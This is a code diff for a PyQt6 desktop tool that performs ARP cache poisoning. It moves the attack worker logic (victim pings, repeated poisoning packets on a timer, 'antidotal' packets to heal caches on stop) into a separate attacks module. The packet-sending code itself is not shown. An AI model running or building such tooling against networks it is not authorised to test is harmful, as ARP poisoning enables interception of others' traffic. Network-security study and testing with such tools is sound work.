@@ -2,43 +2,8 @@ from PyQt6.QtCore import *
 from PyQt6.QtGui import *
 from PyQt6.QtWidgets import *
 from components import HostList, VictimList, InterfaceChooser, Toggle
-from attacks import ARPAttackSettings, send_poisonous_packets, send_antidotal_packets, send_poisonous_pings
-
-class AttackWorker(QObject):
-    finished = pyqtSignal()
-
-    def __init__(self, settings: ARPAttackSettings):
-        super().__init__()
-        self.settings = settings
-
-    def run(self):
-        print('Attack starting')
-
-        # Ping victims to ensure they know of each others existence
-        send_poisonous_pings(self.settings)
-
-        # do the initial chache poisoning
-        for _ in range(self.settings.initial_packets):
-            send_poisonous_packets(self.settings)
-
-        # perform poisoning every so often to prevent chache healing
-        self.timer = QTimer(self)
-        self.timer.timeout.connect(self.poison)
-        self.timer.start(self.settings.seconds_interval * 1000)
-
-    def poison(self):
-        print('poisoning...')
-        send_poisonous_packets(self.settings)
-
-    def stop(self):
-        print('Attack stopping...')
-
-        # heal the victims' caches
-        for _ in range(self.settings.initial_packets):
-            send_antidotal_packets(self.settings)
-
-        self.timer.stop()
-        self.finished.emit()
+from attacks import ARPAttackWorker
+from util import ARPAttackSettings
 
 class ARPWindow(QWidget):
     INTERFACE_CHOOSER = 'interface_chooser'
@@ -116,7 +81,7 @@ class ARPWindow(QWidget):
         if active:
             # create the attack
             self.thread = QThread()
-            self.worker = AttackWorker(self.construct_attack_settings())
+            self.worker = ARPAttackWorker(self.construct_attack_settings())
             self.worker.moveToThread(self.thread)
 
             # connect signals and slots
